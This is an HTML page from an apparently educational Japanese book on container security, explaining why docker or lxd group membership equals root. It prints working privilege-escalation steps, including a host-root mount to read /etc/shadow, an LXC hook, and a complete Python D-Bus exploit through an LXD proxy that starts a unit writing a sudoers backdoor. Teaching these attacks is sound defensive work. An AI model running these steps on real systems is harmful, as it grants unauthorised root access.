@@ -1,0 +1,870 @@
+
+<!DOCTYPE HTML>
+<html lang="" >
+    <head>
+        <meta charset="UTF-8">
+        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+        <title>Adding a user to group · HonKit</title>
+        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+        <meta name="description" content="">
+        <meta name="generator" content="HonKit 3.6.11">
+        
+        
+        
+    
+    <link rel="stylesheet" href="../gitbook/style.css">
+
+    
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-highlight/website.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-search/search.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-fontsettings/website.css">
+                
+            
+        
+
+    
+
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+        
+    
+    
+    <meta name="HandheldFriendly" content="true"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="../gitbook/images/apple-touch-icon-precomposed-152.png">
+    <link rel="shortcut icon" href="../gitbook/images/favicon.ico" type="image/x-icon">
+
+    
+    <link rel="next" href="apparmor-bypass.html" />
+    
+    
+    <link rel="prev" href="DoS.html" />
+    
+
+    </head>
+    <body>
+        
+<div class="book honkit-cloak">
+    <div class="book-summary">
+        
+            
+<div id="book-search-input" role="search">
+    <input type="text" placeholder="Type to search" />
+</div>
+
+            
+                <nav role="navigation">
+                
+
+
+<ul class="summary">
+    
+    
+
+    
+
+    
+        
+        <li class="header">はじめに</li>
+        
+        
+    
+        <li class="chapter " data-level="1.1" data-path="../">
+            
+                <a href="../">
+            
+                    
+                    About
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2" data-path="../introduction.html">
+            
+                <a href="../introduction.html">
+            
+                    
+                    Introduction
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+    
+        
+        <li class="header">コンテナの基礎技術</li>
+        
+        
+    
+        <li class="chapter " data-level="2.1" data-path="../container-basics.html">
+            
+                <a href="../container-basics.html">
+            
+                    
+                    コンテナの基礎技術
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.2" data-path="../namespace/">
+            
+                <a href="../namespace/">
+            
+                    
+                    Namespace
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="2.2.1" data-path="../namespace/uts.html">
+            
+                <a href="../namespace/uts.html">
+            
+                    
+                    UTS Namespace
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.2.2" data-path="../namespace/pid.html">
+            
+                <a href="../namespace/pid.html">
+            
+                    
+                    PID Namespace
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.2.3" data-path="../namespace/mount.html">
+            
+                <a href="../namespace/mount.html">
+            
+                    
+                    Mount Namespace
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.2.4" data-path="../namespace/user.html">
+            
+                <a href="../namespace/user.html">
+            
+                    
+                    User Namespace
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="2.3" data-path="../namespace/chroot-and-pivot_root.html">
+            
+                <a href="../namespace/chroot-and-pivot_root.html">
+            
+                    
+                    chroot and pivot_root
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.4" data-path="../capability/">
+            
+                <a href="../capability/">
+            
+                    
+                    Capability
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.5" data-path="../seccomp/">
+            
+                <a href="../seccomp/">
+            
+                    
+                    Seccomp
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.6" data-path="../lsm/apparmor.html">
+            
+                <a href="../lsm/apparmor.html">
+            
+                    
+                    AppArmor
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.7" data-path="../cgroup/">
+            
+                <a href="../cgroup/">
+            
+                    
+                    cgroup
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+    
+        
+        <li class="header">コンテナのセキュリティと攻撃例</li>
+        
+        
+    
+        <li class="chapter " data-level="3.1" data-path="./">
+            
+                <a href="./">
+            
+                    
+                    Security
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="3.1.1" data-path="breakout-to-host.html">
+            
+                <a href="breakout-to-host.html">
+            
+                    
+                    Breakout Container
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="3.1.2" data-path="sensitive-file-mount.html">
+            
+                <a href="sensitive-file-mount.html">
+            
+                    
+                    Sensitive file mount
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="3.1.3" data-path="DoS.html">
+            
+                <a href="DoS.html">
+            
+                    
+                    DoS
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter active" data-level="3.1.4" data-path="adding-a-user-to-group.html">
+            
+                <a href="adding-a-user-to-group.html">
+            
+                    
+                    Adding a user to group
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="3.1.5" data-path="apparmor-bypass.html">
+            
+                <a href="apparmor-bypass.html">
+            
+                    
+                    AppArmor Bypass
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="3.1.6" data-path="seccomp-bypass.html">
+            
+                <a href="seccomp-bypass.html">
+            
+                    
+                    seccomp Bypass
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="3.1.7" data-path="image/secrets-in-layer.html">
+            
+                <a href="image/secrets-in-layer.html">
+            
+                    
+                    Secrets in Layer
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="3.1.8" data-path="image/scanner.html">
+            
+                <a href="image/scanner.html">
+            
+                    
+                    Image Scanner
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+    
+        
+        <li class="header">Hardening Container</li>
+        
+        
+    
+        <li class="chapter " data-level="4.1" data-path="../hardening/">
+            
+                <a href="../hardening/">
+            
+                    
+                    Hardening Container
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="4.1.1" data-path="../hardening/no-new-privileges.html">
+            
+                <a href="../hardening/no-new-privileges.html">
+            
+                    
+                    No New Privileges
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="4.1.2" data-path="../hardening/apparmor.html">
+            
+                <a href="../hardening/apparmor.html">
+            
+                    
+                    AppArmor
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="4.1.3" data-path="../hardening/seccomp.html">
+            
+                <a href="../hardening/seccomp.html">
+            
+                    
+                    seccomp
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="4.1.4" data-path="../hardening/runtime.html">
+            
+                <a href="../hardening/runtime.html">
+            
+                    
+                    runtime
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="4.1.5" data-path="../hardening/monitoring.html">
+            
+                <a href="../hardening/monitoring.html">
+            
+                    
+                    Monitoring
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="4.1.6" data-path="../hardening/cis-benchmark.html">
+            
+                <a href="../hardening/cis-benchmark.html">
+            
+                    
+                    CIS Benchmark
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+    
+        
+        <li class="header">Kubernetes Security</li>
+        
+        
+    
+        <li class="chapter " data-level="5.1" data-path="../kubernetes/">
+            
+                <a href="../kubernetes/">
+            
+                    
+                    Kubernetes Security
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+    
+        
+        <li class="header">References</li>
+        
+        
+    
+        <li class="chapter " data-level="6.1" data-path="../REFERENCES.html">
+            
+                <a href="../REFERENCES.html">
+            
+                    
+                    References
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+    
+
+    <li class="divider"></li>
+
+    <li>
+        <a href="https://github.com/honkit/honkit" target="blank" class="gitbook-link">
+            Published with HonKit
+        </a>
+    </li>
+</ul>
+
+
+                </nav>
+            
+        
+    </div>
+
+    <div class="book-body">
+        
+            <div class="body-inner">
+                
+                    
+
+<div class="book-header" role="navigation">
+    
+
+    <!-- Title -->
+    <h1>
+        <i class="fa fa-circle-o-notch fa-spin"></i>
+        <a href=".." >Adding a user to group</a>
+    </h1>
+</div>
+
+
+
+
+                    <div class="page-wrapper" tabindex="-1" role="main">
+                        <div class="page-inner">
+                            
+<div id="book-search-results">
+    <div class="search-noresults">
+    
+                                <section class="normal markdown-section">
+                                
+                                <h1 id="&#x30B3;&#x30F3;&#x30C6;&#x30CA;&#x5B9F;&#x884C;&#x6A29;&#x9650;&#x3092;&#x6301;&#x3064;&#x30B0;&#x30EB;&#x30FC;&#x30D7;&#x3078;&#x306E;&#x30E6;&#x30FC;&#x30B6;&#x30FC;&#x8FFD;&#x52A0;">&#x30B3;&#x30F3;&#x30C6;&#x30CA;&#x5B9F;&#x884C;&#x6A29;&#x9650;&#x3092;&#x6301;&#x3064;&#x30B0;&#x30EB;&#x30FC;&#x30D7;&#x3078;&#x306E;&#x30E6;&#x30FC;&#x30B6;&#x30FC;&#x8FFD;&#x52A0;</h1>
+<p><code>docker</code> &#x30B0;&#x30EB;&#x30FC;&#x30D7;&#x3084; <code>lxd</code> &#x30B0;&#x30EB;&#x30FC;&#x30D7;&#x3078;&#x306E;&#x30E6;&#x30FC;&#x30B6;&#x30FC;&#x8FFD;&#x52A0;&#x3092;&#x884C;&#x3046;&#x3053;&#x3068;&#x306F;&#x3001;&#x305D;&#x306E;&#x30E6;&#x30FC;&#x30B6;&#x30FC;&#x306B; root &#x6A29;&#x9650;&#x3092;&#x8FFD;&#x52A0;&#x3059;&#x308B;&#x3053;&#x3068;&#x3068;&#x540C;&#x7FA9;&#x3067;&#x3059;&#x3002;<br>&#x4F8B;&#x3048;&#x3070; docker &#x306E;&#x5834;&#x5408;&#x306F;&#x6B21;&#x306E;&#x3088;&#x3046;&#x306B;&#x30DB;&#x30B9;&#x30C8;&#x306E;&#x30EB;&#x30FC;&#x30C8;&#x30C7;&#x30A3;&#x30EC;&#x30AF;&#x30C8;&#x30EA;&#x3092;&#x30DE;&#x30A6;&#x30F3;&#x30C8;&#x3059;&#x308B;&#x3053;&#x3068;&#x3067;&#x3001;&#x30DB;&#x30B9;&#x30C8;&#x5074;&#x3067;&#x4EFB;&#x610F;&#x306E;&#x64CD;&#x4F5C;&#x3092;&#x884C;&#x3046;&#x3053;&#x3068;&#x304C;&#x53EF;&#x80FD;&#x306B;&#x306A;&#x308A;&#x307E;&#x3059;&#x3002;</p>
+<pre><code class="lang-sh">ubuntu@sandbox:~$ cat /etc/shadow
+cat: /etc/shadow: Permission denied
+ubuntu@sandbox:~$ docker run --rm -it -v /:/hostfs ubuntu:latest bash
+root@f6a72ca2aaf6:/<span class="hljs-comment"># cat /hostfs/etc/shadow</span>
+root:*:18444:0:99999:7:::
+...
+</code></pre>
+<p>&#x305F;&#x3060;&#x3057;&#x3001;rootless docker &#x306E;&#x3088;&#x3046;&#x306B;&#x30B3;&#x30F3;&#x30C6;&#x30CA;&#x3092; root &#x4EE5;&#x5916;&#x3067;&#x52D5;&#x304B;&#x3057;&#x3066;&#x3044;&#x308B;&#x5834;&#x5408;&#x306F;&#x3001;&#x4E00;&#x822C;&#x30E6;&#x30FC;&#x30B6;&#x30FC;&#x6A29;&#x9650;&#x3067;&#x30B3;&#x30F3;&#x30C6;&#x30CA;&#x3092;&#x4F5C;&#x6210;&#x3059;&#x308B;&#x305F;&#x3081;&#x3001;&#x3053;&#x306E;&#x653B;&#x6483;&#x3092;&#x7DE9;&#x548C;&#x3059;&#x308B;&#x3053;&#x3068;&#x304C;&#x3067;&#x304D;&#x307E;&#x3059;&#x3002;</p>
+<pre><code class="lang-sh">ubuntu@rootless-docker:~$ docker run --rm -it -v /:/hostfs ubuntu:latest bash
+root@0e55694c273c:/<span class="hljs-comment"># cat /hostfs/etc/shadow</span>
+cat: /hostfs/etc/shadow: Permission denied
+</code></pre>
+<h2 id="lxd-&#x30B0;&#x30EB;&#x30FC;&#x30D7;&#x3078;&#x306E;&#x8FFD;&#x52A0;">lxd &#x30B0;&#x30EB;&#x30FC;&#x30D7;&#x3078;&#x306E;&#x8FFD;&#x52A0;</h2>
+<p>LXD &#x306E;&#x5834;&#x5408;&#x3001;&#x30E6;&#x30FC;&#x30B6;&#x30FC;&#x3092; <code>lxd</code> &#x30B0;&#x30EB;&#x30FC;&#x30D7;&#x306B;&#x8FFD;&#x52A0;&#x3059;&#x308B;&#x3053;&#x3068;&#x3067;&#x30B3;&#x30F3;&#x30C6;&#x30CA;&#x306E;&#x64CD;&#x4F5C;&#x304C;&#x53EF;&#x80FD;&#x306B;&#x306A;&#x308A;&#x307E;&#x3059;&#x304C;&#x3001;&#x3053;&#x308C;&#x3082; docker &#x540C;&#x69D8;&#x306B; root &#x6A29;&#x9650;&#x3092;&#x4E0E;&#x3048;&#x308B;&#x3053;&#x3068;&#x3068;&#x540C;&#x7FA9;&#x3067;&#x3059;&#x3002;  </p>
+<h3 id="hook-&#x3092;&#x4F7F;&#x3063;&#x305F;&#x6A29;&#x9650;&#x6607;&#x683C;">hook &#x3092;&#x4F7F;&#x3063;&#x305F;&#x6A29;&#x9650;&#x6607;&#x683C;</h3>
+<p>LXC &#x306B;&#x306F; hook &#x6A5F;&#x80FD;&#x304C;&#x3042;&#x308A;&#x3001;&#x3053;&#x308C;&#x3092;&#x5229;&#x7528;&#x3057;&#x3066; root &#x3068;&#x3057;&#x3066;&#x4EFB;&#x610F;&#x306E;&#x30B3;&#x30DE;&#x30F3;&#x30C9;&#x3092;&#x5B9F;&#x884C;&#x3067;&#x304D;&#x307E;&#x3059;&#x3002;</p>
+<pre><code class="lang-sh">$ lxc launch images:ubuntu/trusty/amd64 runme -c raw.lxc=<span class="hljs-string">&quot;lxc.hook.pre-start=sh -c &apos;echo foo &gt;/runme&apos;&quot;</span>
+Creating runme
+Starting runme
+user@host:~$ ls <span class="hljs-_">-l</span> /runme 
+-rw-r--r-- 1 root root 5 May  7 10:29 /runme
+</code></pre>
+<h3 id="lxd-proxy-&#x3092;&#x5229;&#x7528;&#x3057;&#x305F;&#x6A29;&#x9650;&#x6607;&#x683C;">LXD proxy &#x3092;&#x5229;&#x7528;&#x3057;&#x305F;&#x6A29;&#x9650;&#x6607;&#x683C;</h3>
+<p>LXD &#x306E; proxy &#x7D4C;&#x7531;&#x3067; unix socket &#x306B;&#x30A2;&#x30AF;&#x30BB;&#x30B9;&#x3059;&#x308B;&#x3068;&#x3001;&#x305D;&#x306E;&#x8CC7;&#x683C;&#x60C5;&#x5831;&#x306F; root &#x306B;&#x306A;&#x3063;&#x3066;&#x3057;&#x307E;&#x3044;&#x307E;&#x3059;&#x3002;<br>&#x3053;&#x308C;&#x3092;&#x5229;&#x7528;&#x3057;&#x3066; systemd &#x306E; socket &#x306B;&#x63A5;&#x7D9A;&#x3057;&#x3066;&#x4EFB;&#x610F;&#x306E; service &#x3092;&#x64CD;&#x4F5C;&#x3059;&#x308B;&#x3053;&#x3068;&#x304C;&#x3067;&#x304D;&#x307E;&#x3059;&#x3002;</p>
+<p>&#x4F8B;&#x3048;&#x3070;&#x6B21;&#x306E;&#x3088;&#x3046;&#x306A; unix socket &#x3067;&#x3084;&#x308A;&#x53D6;&#x308A;&#x3092;&#x884C;&#x3046;&#x30D7;&#x30ED;&#x30B0;&#x30E9;&#x30E0;&#x3092;&#x8D77;&#x52D5;&#x3057;&#x307E;&#x3059;&#x3002;</p>
+<pre><code class="lang-sh">$ cat echo.py
+import socket
+import struct
+
+def main():
+    <span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;Echo UNIX peercreds&quot;</span><span class="hljs-string">&quot;&quot;</span>
+    listen_sock = <span class="hljs-string">&apos;/tmp/echo.sock&apos;</span>
+    sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
+    sock.bind(listen_sock)
+    sock.listen()
+
+    <span class="hljs-keyword">while</span> True:
+        <span class="hljs-built_in">print</span>(<span class="hljs-string">&apos;waiting for a connection&apos;</span>)
+        connection = sock.accept()[0]
+        peercred = connection.getsockopt(socket.SOL_SOCKET, socket.SO_PEERCRED,
+                                         struct.calcsize(<span class="hljs-string">&quot;3i&quot;</span>))
+        pid, uid, gid = struct.unpack(<span class="hljs-string">&quot;3i&quot;</span>, peercred)
+
+        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;PID: {}, UID: {}, GID: {}&quot;</span>.format(pid, uid, gid))
+
+        <span class="hljs-built_in">continue</span>
+
+<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&apos;__main__&apos;</span>:
+    main()
+
+$ python3 echo.py
+waiting <span class="hljs-keyword">for</span> a connection
+<span class="hljs-comment"># nc -U /tmp/echo.sock &#x3067;&#x3064;&#x306A;&#x3050;&#x3068;&#x3001;&#x305D;&#x306E; UID, GID &#x304C;&#x8868;&#x793A;&#x3055;&#x308C;&#x308B;</span>
+PID: 15373, UID: 1001, GID: 1001
+</code></pre>
+<p>LXD proxy &#x3092;&#x7528;&#x610F;&#x3057;&#x3066; root &#x3067;&#x63A5;&#x7D9A;&#x3055;&#x308C;&#x308B;&#x304B;&#x3092;&#x78BA;&#x8A8D;&#x3057;&#x307E;&#x3059;&#x3002;&#x6B21;&#x306E;&#x30B3;&#x30DE;&#x30F3;&#x30C9;&#x3067;&#x30B3;&#x30F3;&#x30C6;&#x30CA;&#x5185;&#x306E; <code>/tmp/proxy.sock</code> &#x304B;&#x3089;&#x30DB;&#x30B9;&#x30C8;&#x306E; <code>/tmp/echo.sock</code> &#x306B;&#x63A5;&#x7D9A;&#x3067;&#x304D;&#x307E;&#x3059;&#x3002;</p>
+<pre><code class="lang-sh">$ lxc config device add <span class="hljs-built_in">test</span> proxy_sock proxy connect=unix:/tmp/echo.sock listen=unix:/tmp/proxy.sock <span class="hljs-built_in">bind</span>=container mode=0777
+Device proxy_sock added to <span class="hljs-built_in">test</span>
+</code></pre>
+<p>&#x540C;&#x69D8;&#x306B;&#x63A5;&#x7D9A;&#x3059;&#x308B;&#x3068; root &#x306B;&#x306A;&#x3063;&#x3066;&#x3044;&#x308B;&#x3053;&#x3068;&#x304C;&#x308F;&#x304B;&#x308A;&#x307E;&#x3059;&#x3002;</p>
+<pre><code class="lang-sh">$ lxc <span class="hljs-built_in">exec</span> <span class="hljs-built_in">test</span> -- sudo --user ubuntu --login
+ubuntu@<span class="hljs-built_in">test</span>:~$ nc -U /tmp/proxy.sock
+
+$ python3 test.py
+...
+PID: 14988, UID: 0, GID: 0
+</code></pre>
+<p>&#x3053;&#x308C;&#x3082; lxd &#x304C; root &#x3067;&#x52D5;&#x3044;&#x3066;&#x3044;&#x308B;&#x3053;&#x3068;&#x304C;&#x7406;&#x7531;&#x3067;&#x3059;&#x3002;</p>
+<pre><code class="lang-sh">$ ps aux | grep 14988
+root     14988  0.0  0.7 1230076 30576 ?       Ssl  03:54   0:00 /snap/lxd/current/bin/lxd forkproxy -- 14522 -1 unix:/tmp/proxy.sock 13977 -1 unix:/var/lib/snapd/hostfs/tmp/echo.sock /var/snap/lxd/common/lxd/logs/<span class="hljs-built_in">test</span>/proxy.proxy_sock.log /var/snap/lxd/common/lxd/devices/<span class="hljs-built_in">test</span>/proxy.proxy_sock   0777
+</code></pre>
+<p>&#x3053;&#x308C;&#x3092;&#x5229;&#x7528;&#x3057;&#x3066; systemd &#x306E; socket &#x3068;&#x901A;&#x4FE1;&#x3059;&#x308B;&#x3053;&#x3068;&#x3067;&#x4EFB;&#x610F;&#x30B3;&#x30FC;&#x30C9;&#x5B9F;&#x884C;&#x306B;&#x3064;&#x306A;&#x3052;&#x308B;&#x3053;&#x3068;&#x304C;&#x3067;&#x304D;&#x307E;&#x3059;&#x3002;<br>systemd &#x304C;&#x5229;&#x7528;&#x3059;&#x308B; <code>/run/systemd/private</code> &#x3092;&#x30B3;&#x30F3;&#x30C6;&#x30CA;&#x5185;&#x306E; <code>/tmp/container_sock</code> &#x306B; bind &#x3057;&#x3001;&#x3055;&#x3089;&#x306B;&#x305D;&#x308C;&#x3092;&#x30DB;&#x30B9;&#x30C8;&#x5074;&#x306B; bind &#x3059;&#x308B;&#x3053;&#x3068;&#x3067;&#x3001;&#x30B3;&#x30F3;&#x30C6;&#x30CA;&#x306B;&#x5165;&#x3089;&#x305A;&#x3068;&#x3082;&#x63A5;&#x7D9A;&#x3067;&#x304D;&#x308B;&#x3088;&#x3046;&#x306B;&#x3057;&#x307E;&#x3059;&#x3002;</p>
+<pre><code class="lang-sh">lowpriv@vagrant:~$ lxc config device add <span class="hljs-built_in">test</span> container_sock proxy connect=unix:/run/systemd/private listen=unix:/tmp/container_sock <span class="hljs-built_in">bind</span>=container mode=0777
+Device container_sock added to <span class="hljs-built_in">test</span>
+lowpriv@vagrant:~$ lxc config device add <span class="hljs-built_in">test</span> host_sock proxy connect=unix:/tmp/container_sock listen=unix:/tmp/host_sock <span class="hljs-built_in">bind</span>=host mode=0777
+Device host_sock added to <span class="hljs-built_in">test</span>
+</code></pre>
+<p>&#x81EA;&#x8EAB;&#x3092; sudoers &#x306B;&#x8FFD;&#x52A0;&#x3059;&#x308B; systemd unit &#x30D5;&#x30A1;&#x30A4;&#x30EB;&#x3092;&#x4F5C;&#x6210;&#x3057;&#x3001;systemd socket &#x3092;&#x901A;&#x3057;&#x3066;&#x5B9F;&#x884C;&#x3059;&#x308B;&#x3053;&#x3068;&#x3067; root &#x306B;&#x6A29;&#x9650;&#x6607;&#x683C;&#x3059;&#x308B;&#x3053;&#x3068;&#x304C;&#x3067;&#x304D;&#x307E;&#x3059;&#x3002;</p>
+<pre><code class="lang-sh">$ cat /tmp/evil.service
+[Unit]
+Description=evil
+[Service]
+Type=oneshot
+ExecStart=/bin/sh -c <span class="hljs-string">&quot;echo user ALL=\(ALL\) NOPASSWD: ALL &gt;&gt; /etc/sudoers&quot;</span>
+[Install]
+WantedBy=multi-user.target
+
+$ cat exploit.py
+import socket
+import sys
+import time
+
+AUTH = u<span class="hljs-string">&apos;\0AUTH EXTERNAL 30\r\nNEGOTIATE_UNIX_FD\r\nBEGIN\r\n&apos;</span>
+
+LINK = u<span class="hljs-string">&apos;l\1\4\1$\0\0\0\1\0\0\0\242\0\0\0\1\1o\0\31\0\0\0/org/freedesktop/systemd1\0\0\0\0\0\0\0\3\1s\0\r\0\0\0LinkUnitFiles\0\0\0\2\1s\0 \0\0\0org.freedesktop.systemd1.Manager\0\0\0\0\0\0\0\0\6\1s\0\30\0\0\0org.freedesktop.systemd1\0\0\0\0\0\0\0\0\10\1g\0\4asbb\0\0\0\0\0\0\0\26\0\0\0\21\0\0\0/tmp/evil.service\0\0\0\0\0\0\0\0\0\0\0&apos;</span>
+
+RELOAD = u<span class="hljs-string">&apos;l\1\4\1\0\0\0\0\2\0\0\0\211\0\0\0\1\1o\0\31\0\0\0/org/freedesktop/systemd1\0\0\0\0\0\0\0\3\1s\0\6\0\0\0Reload\0\0\2\1s\0 \0\0\0org.freedesktop.systemd1.Manager\0\0\0\0\0\0\0\0\6\1s\0\30\0\0\0org.freedesktop.systemd1\0\0\0\0\0\0\0\0&apos;</span>
+
+START = u<span class="hljs-string">&apos;l\1\4\1 \0\0\0\1\0\0\0\240\0\0\0\1\1o\0\31\0\0\0/org/freedesktop/systemd1\0\0\0\0\0\0\0\3\1s\0\t\0\0\0StartUnit\0\0\0\0\0\0\0\2\1s\0 \0\0\0org.freedesktop.systemd1.Manager\0\0\0\0\0\0\0\0\6\1s\0\30\0\0\0org.freedesktop.systemd1\0\0\0\0\0\0\0\0\10\1g\0\2ss\0\f\0\0\0evil.service\0\0\0\0\7\0\0\0replace\0&apos;</span>
+
+def send_msg(sock_name, msg):
+    client_sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
+    client_sock.connect(sock_name)
+
+    try:
+        client_sock.sendall(AUTH.encode(<span class="hljs-string">&apos;latin-1&apos;</span>))
+        reply = client_sock.recv(8192).decode(<span class="hljs-string">&quot;latin-1&quot;</span>)
+        <span class="hljs-built_in">print</span>(reply)
+
+        client_sock.sendall(msg.encode(<span class="hljs-string">&apos;latin-1&apos;</span>))
+        reply = client_sock.recv(8192).decode(<span class="hljs-string">&quot;latin-1&quot;</span>)
+
+        <span class="hljs-built_in">print</span>(reply)
+    except:
+        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Connection reset...&quot;</span>)
+
+def main():
+
+    <span class="hljs-keyword">for</span> msg <span class="hljs-keyword">in</span> [LINK, RELOAD, START]:
+        send_msg(sys.argv[1], msg)
+        time.sleep(1)
+
+<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&apos;__main__&apos;</span>:
+    main()
+
+$ python3 exploit.py
+OK c00157aa91bf4b70a9fcbe8e556ca3c1
+AGREE_UNIX_FD
+
+lo/org/freedesktop/systemd1s org.freedesktop.systemd1.ManagersUnitFilesChangedsorg.freedesktop.systemd1lR&lt;usorg.freedesktop.systemdga(sss)Jsymlink /etc/systemd/system/evil.service/tmp/evil.service
+OK 95eb8e05ae1647c7ba5aae363557ff5d
+AGREE_UNIX_FD
+
+lo/org/freedesktop/systemd1s org.freedesktop.systemd1.Managers  Reloadingsorg.freedesktop.systemdgb
+OK 92f3058be4c74bf5a7f05a16182f393a
+AGREE_UNIX_FD
+
+lY&#xB6;o-/org/freedesktop/systemd1/unit/evil_2eservicesorg.freedesktop.DBus.PropertiessPropertiesChangedsorg.freedesktop.systemdsa{sv}as org.freedesktop.systemd1.Service&#xBC;MainPIDu
+ControlPIDu
+StatusTexts
+           StatusErrnoiResults  <span class="hljs-built_in">exit</span>-codeUIDu&#xFF;&#xFF;&#xFF;&#xFF;GIDu&#xFF;&#xFF;&#xFF;&#xFF;       NRestartsuExecMainStartTimestampt&#xD8;
+&#xA9;ExecMainStartTimestampMonotonict&#xD4;O&#xD4;
+&#xA9;ExecMainExitTimestampMonotonict&#xEE;&#xD4;
+
+ExecMainPIDu^?
+              ExecMainCodeiExecMainStatusii
+ExecStartPost                              ExecStartPre ExecStart
+ExecReloaExecStop
+                 ExecStopPost
+
+$ sudo su
+root@host:~/<span class="hljs-comment"># id</span>
+uid=0(root) gid=0(root) groups=0(root)
+</code></pre>
+
+                                
+                                </section>
+                            
+    </div>
+    <div class="search-results">
+        <div class="has-results">
+            
+            <h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
+            <ul class="search-results-list"></ul>
+            
+        </div>
+        <div class="no-results">
+            
+            <h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
+            
+        </div>
+    </div>
+</div>
+
+                        </div>
+                    </div>
+                
+            </div>
+
+            
+                
+                <a href="DoS.html" class="navigation navigation-prev " aria-label="Previous page: DoS">
+                    <i class="fa fa-angle-left"></i>
+                </a>
+                
+                
+                <a href="apparmor-bypass.html" class="navigation navigation-next " aria-label="Next page: AppArmor Bypass">
+                    <i class="fa fa-angle-right"></i>
+                </a>
+                
+            
+        
+    </div>
+
+    <script>
+        var gitbook = gitbook || [];
+        gitbook.push(function() {
+            gitbook.page.hasChanged({"page":{"title":"Adding a user to group","level":"3.1.4","depth":2,"next":{"title":"AppArmor Bypass","level":"3.1.5","depth":2,"path":"security/apparmor-bypass.md","ref":"security/apparmor-bypass.md","articles":[]},"previous":{"title":"DoS","level":"3.1.3","depth":2,"path":"security/DoS.md","ref":"security/DoS.md","articles":[]},"dir":"ltr"},"config":{"plugins":[],"root":"./source","styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"pluginsConfig":{"highlight":{},"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"theme":"default","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56},"embedFonts":false},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{},"gitbook":"*"},"file":{"path":"security/adding-a-user-to-group.md","mtime":"2020-11-15T05:32:27.173Z","type":"markdown"},"gitbook":{"version":"3.6.11","time":"2020-11-15T10:49:23.747Z"},"basePath":"..","book":{"language":""}});
+        });
+    </script>
+</div>
+
+        
+    <noscript>
+        <style>
+            .honkit-cloak {
+                display: block !important;
+            }
+        </style>
+    </noscript>
+    <script>
+        // Restore sidebar state as critical path for prevent layout shift
+        function __init__getSidebarState(defaultValue){
+            var baseKey = "";
+            var key = baseKey + ":sidebar";
+            try {
+                var value = localStorage[key];
+                if (value === undefined) {
+                    return defaultValue;
+                }
+                var parsed = JSON.parse(value);
+                return parsed == null ? defaultValue : parsed;
+            } catch (e) {
+                return defaultValue;
+            }
+        }
+        function __init__restoreLastSidebarState() {
+            var isMobile = window.matchMedia("(max-width: 600px)").matches;
+            if (isMobile) {
+                // Init last state if not mobile
+                return;
+            }
+            var sidebarState = __init__getSidebarState(true);
